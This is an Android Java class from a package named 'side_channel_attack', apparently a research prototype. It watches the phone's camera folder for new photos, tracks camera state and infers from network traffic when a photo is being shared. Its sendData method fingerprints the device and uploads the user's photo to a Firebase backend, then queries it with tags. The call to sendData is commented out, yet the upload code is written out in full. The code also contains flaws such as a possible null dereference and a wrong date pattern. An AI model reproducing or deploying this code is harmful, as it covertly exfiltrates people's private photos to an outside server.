package com.example.side_channel_attack;

import android.app.Activity;
import android.content.Context;
import android.hardware.camera2.CameraManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.FileObserver;
import android.support.annotation.NonNull;
import android.system.ErrnoException;
import android.system.Os;
import android.system.StructStat;

import com.google.android.gms.tasks.Continuation;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.functions.FirebaseFunctions;
import com.google.firebase.functions.HttpsCallableResult;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

public class CameraStateDetector {
    private FileObserver observer;
    private int RECORD_STATE = 1;
    private int TRACK_STATE = 0;

    private File image;
    private String timestamp;
    private String id;
    private String url;

    public CameraStateDetector(final Activity activity){

        final File cameraDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        final File dir = new File(cameraDirectory.getAbsolutePath() + "/Camera");
        observer = new FileObserver(dir.getPath()) {


            @Override
            public void onEvent(int event, String file) {
                System.out.println(RECORD_STATE);
                if(RECORD_STATE == 1) {
                    if (event == FileObserver.CREATE && !file.equals(".probe")) { // check if its a "create" and not equal to .probe because thats created every time camera is launched
                        image = new File(dir.getPath() + "/" + file);
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                            StructStat stat = null;
                            try {
                                System.out.println(dir.getPath() + "/" + file);
                                stat = Os.stat(dir.getPath() + "/" + file); // File path here
                            } catch (ErrnoException e) {
                                e.printStackTrace();
                            }
                            long t2 = stat.st_atime * 1000L;
                            Calendar calendar = Calendar.getInstance();
                            calendar.setTimeInMillis(t2);

                            SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy hh-MM-ss");
                            String formattedDate = formatter.format(calendar.getTime());
                            System.out.println(formattedDate);
                        }
                        System.out.println(image.getPath());
                        RECORD_STATE = 0;
                        TRACK_STATE = 1;
                    }
                }
            }
        };
        observer.startWatching();


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            final PacketCatcher packetCatcher = new PacketCatcher();
            CameraManager manager = (CameraManager) activity.getSystemService(Context.CAMERA_SERVICE);
            manager.registerAvailabilityCallback(new CameraManager.AvailabilityCallback() {
                @Override
                public void onCameraAvailable(String cameraId) {
                    super.onCameraAvailable(cameraId);
                    if (TRACK_STATE == 1) {
                        System.out.println("sent123456789");
                        System.out.println(image != null);
                        System.out.println("entered");

                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                            StructStat stat = null;
                            try {
                                System.out.println(image.getPath());
                                stat = Os.stat(image.getPath()); // File path here
                            } catch (ErrnoException e) {
                                e.printStackTrace();
                            }
                            long t2 = stat.st_atime * 1000L;
                            Calendar calendar = Calendar.getInstance();
                            calendar.setTimeInMillis(t2);

                            SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy hh-MM-ss");
                            String formattedDate = formatter.format(calendar.getTime());
                            System.out.println(formattedDate);
                        }

//                        boolean outcomeOf1stEvent = packetCatcher.checkPeriodForUpload(
//                                10000,
//                                5,
//                                1,
//                                6000,
//                                4000);
//
                        boolean outcomeOf1stEvent = packetCatcher.scan(10000);
                        System.out.println(outcomeOf1stEvent + " dssa");

                        if(outcomeOf1stEvent && image != null) {
                            System.out.println("sent123456");
                            boolean outcomeOf2ndEvent = packetCatcher.checkPeriodForUpload(
                                    60000,
                                    2,
                                    1,
                                    1600,
                                    1200);
                            if (outcomeOf2ndEvent) {
                                System.out.println("sent123");
                                boolean outcomeOf3rdEvent = packetCatcher.checkPeriodForDownload(
                                        20000,
                                        200,
                                        1,
                                        1800,
                                        1200);
                                if(outcomeOf3rdEvent){
//                                    sendData();
                                    System.out.println("sent");
                                }
                            }
                        } else {
                            RECORD_STATE = 0;
                        }
                        RECORD_STATE = 1;
                        TRACK_STATE = 0;
                        if (outcomeOf1stEvent == true || outcomeOf1stEvent == false) {
                            return;
                        }
                    }
                }

                @Override
                public void onCameraUnavailable(String cameraId) {
                    super.onCameraUnavailable(cameraId);
                    RECORD_STATE = 1;
                }
            }, null);
        }
    }

    private void sendData() {
        SimpleDateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
        Calendar calendar = Calendar.getInstance();

        FirebaseFirestore db = FirebaseFirestore.getInstance();
        final DocumentReference userCheckRef = db.collection("users").document();


        id = "" +
                Build.BOARD.length() % 10 + Build.BRAND.length() % 10 +
                Build.CPU_ABI.length() % 10 + Build.DEVICE.length() % 10 +
                Build.DISPLAY.length() % 10 + Build.HOST.length() % 10 +
                Build.ID.length() % 10 + Build.MANUFACTURER.length() % 10 +
                Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10 +
                Build.TAGS.length() % 10 + Build.TYPE.length() % 10 +
                Build.USER.length() % 10; //13 digits
        final DocumentReference entryRef = db.collection("invocations").document(id);
        final DocumentReference existRef = db.collection("users").document(id);

        final Map<String, Object> entry = new HashMap<>();

        timestamp = dateFormat.format(calendar.getTime());
        entry.put("date", timestamp);
        entry.put("id", id);


        existRef.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DocumentSnapshot> task) {
                if (!task.getResult().exists()) {

                    StorageReference storageRef = FirebaseStorage.getInstance().getReference();
                    final StorageReference ref = storageRef.child(id + "_" + System.currentTimeMillis() + ".jpg");
                    InputStream stream = null;

                    try {
                        stream = new FileInputStream(image);
                    } catch (FileNotFoundException e) {
                        e.printStackTrace();
                    }

                    final InputStream finalStream = stream;

                    ref.putStream(finalStream).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                            ref.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                                @Override
                                public void onSuccess(final Uri uri) {
                                    url = uri.toString();
                                    entryRef.set(entry).addOnCompleteListener(new OnCompleteListener<Void>() {
                                        @Override
                                        public void onComplete(@NonNull Task<Void> task) {

                                            String h1 = "car";
                                            String h2 = "black";
                                            String tags = "[\"' + h1 + '\",\"' + h2 + '\"]";
                                            Map<String, Object> multiParameters = getParams("tags", tags);
                                            multiParameters.put("tags", tags);
                                            FirebaseFunctions mFunctions = FirebaseFunctions.getInstance();
                                            mFunctions
                                                    .getHttpsCallable("searchMulti")
                                                    .call(multiParameters)
                                                    .continueWith(new Continuation<HttpsCallableResult, String>() {
                                                        @Override
                                                        public String then(@NonNull Task<HttpsCallableResult> task) throws Exception {
                                                            System.out.println("success123");
                                                            String result = (String) task.getResult().getData();
                                                            return result;
                                                        }
                                                    });


                                            Map<String, Object> singleParams = getParams("tag", "car");
                                            mFunctions
                                                    .getHttpsCallable("searchSingle")
                                                    .call(singleParams)
                                                    .continueWith(new Continuation<HttpsCallableResult, String>() {
                                                        @Override
                                                        public String then(@NonNull Task<HttpsCallableResult> task) throws Exception {
                                                            System.out.println("success1223");
                                                            String result = (String) task.getResult().getData();
                                                            return result;
                                                        }
                                                    });
                                        }
                                    });
                                }
                            });
                        }
                    });
                }
            }
        });
    }


    public Map<String, Object> getParams(String additKey, String additVal) {
        Map<String, Object> parameters = new HashMap<>();
        //default
        parameters.put("url", url);
        parameters.put("id", id);
        parameters.put("timestamp", timestamp);
        //additional
        parameters.put(additKey, additVal);
        return parameters;
    }
}
